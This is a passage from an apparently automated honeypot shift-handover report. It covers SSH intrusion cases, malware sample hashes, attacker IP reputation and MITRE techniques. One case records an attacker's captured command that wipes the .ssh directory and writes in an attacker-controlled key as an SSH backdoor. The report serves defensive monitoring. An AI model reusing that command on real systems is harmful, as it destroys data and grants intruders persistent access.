| `2026-04-11 16:24:35` | `cowrie.client.version` |
| `2026-04-11 16:24:35` | `cowrie.client.kex` |
| `2026-04-11 16:24:36` | `cowrie.login.success` |
| `2026-04-11 16:24:36` | `cowrie.session.params` |
| `2026-04-11 16:24:36` | `cowrie.command.input` |
| `2026-04-11 16:24:36` | `cowrie.command.failed` |
| `2026-04-11 16:24:36` | `cowrie.log.closed` |
| `2026-04-11 16:24:37` | `cowrie.session.params` |
| `2026-04-11 16:24:37` | `cowrie.command.input` |
| `2026-04-11 16:24:37` | `cowrie.session.file_download` |
| `2026-04-11 16:24:37` | `cowrie.log.closed` |
| `2026-04-11 16:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2e6be0736f5

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:24 |
| **Last Seen** | 2026-04-11 16:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:24:39` | `cowrie.session.connect` |
| `2026-04-11 16:24:39` | `cowrie.client.version` |
| `2026-04-11 16:24:39` | `cowrie.client.kex` |
| `2026-04-11 16:24:40` | `cowrie.login.success` |
| `2026-04-11 16:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc97908af8a0

| Field | Detail |
|---|---|
| **Source IP** | `43.155.21[.]198` |
| **First Seen** | 2026-04-11 16:25 |
| **Last Seen** | 2026-04-11 16:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:25:48` | `cowrie.session.connect` |
| `2026-04-11 16:25:48` | `cowrie.client.version` |
| `2026-04-11 16:25:48` | `cowrie.client.kex` |
| `2026-04-11 16:25:49` | `cowrie.login.success` |
| `2026-04-11 16:25:49` | `cowrie.session.params` |
| `2026-04-11 16:25:49` | `cowrie.command.input` |
| `2026-04-11 16:25:49` | `cowrie.command.failed` |
| `2026-04-11 16:25:49` | `cowrie.log.closed` |
| `2026-04-11 16:25:49` | `cowrie.session.params` |
| `2026-04-11 16:25:49` | `cowrie.command.input` |
| `2026-04-11 16:25:50` | `cowrie.session.file_download` |
| `2026-04-11 16:25:50` | `cowrie.log.closed` |
| `2026-04-11 16:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.21[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.155.21[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6dbd4e1bb2

| Field | Detail |
|---|---|
| **Source IP** | `43.155.21[.]198` |
| **First Seen** | 2026-04-11 16:25 |
| **Last Seen** | 2026-04-11 16:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:25:52` | `cowrie.session.connect` |
| `2026-04-11 16:25:52` | `cowrie.client.version` |
| `2026-04-11 16:25:52` | `cowrie.client.kex` |
| `2026-04-11 16:25:52` | `cowrie.login.success` |
| `2026-04-11 16:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.21[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.155.21[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `197.227.8[.]186` | **25** | 2026-04-11 15:44 | 2026-04-11 16:27 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.135.161[.]60` | **25** | 2026-04-11 15:07 | 2026-04-11 15:12 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `81.30.162[.]19` | **25** | 2026-04-11 14:37 | 2026-04-11 15:13 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `27.112.78[.]223` | **3** | 2026-04-11 14:38 | 2026-04-11 14:43 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `40.124.174[.]226` | **2** | 2026-04-11 16:25 | 2026-04-11 16:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.49.238[.]22` | 1 | 2026-04-11 14:35 | 2026-04-11 14:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]80` | 1 | 2026-04-11 14:37 | 2026-04-11 14:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.155.21[.]198` | 1 | 2026-04-11 16:25 | 2026-04-11 16:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.20.236[.]52` | 1 | 2026-04-11 16:26 | 2026-04-11 16:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.139.79[.]249` | 1 | 2026-04-11 16:08 | 2026-04-11 16:09 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `85.139.79[.]249` | PT | NOS COMUNICACOES S.A. | **100** ⚠️ | 0 |
| `103.49.238[.]22` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 43 |
| `14.103.115[.]80` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `58.20.236[.]52` | CN | CNC Group HuNan JiShou network | **100** ⚠️ | 49 |
| `43.155.21[.]198` | HK | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 50 |
| `27.112.78[.]223` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `197.227.8[.]186` | MU | MauritiusTelecom | **100** ⚠️ | 50 |
| `81.30.162[.]19` | UA | This is a Vinteleport company Core network, used for | **100** ⚠️ | 40 |
| `40.124.174[.]226` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `206.135.161[.]60` | PK | Cyber Internet Services (Pvt.) Ltd. | **98** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 124 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 66 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 55 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 33 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 33 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 178 cases |
| Tool 34  | Credential Extractor        | ✅ 121 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (15.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 66 priority case(s) shown individually · 10 recon entry/entries in table (5 group(s) consolidating 80 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-11T16:35:46Z_
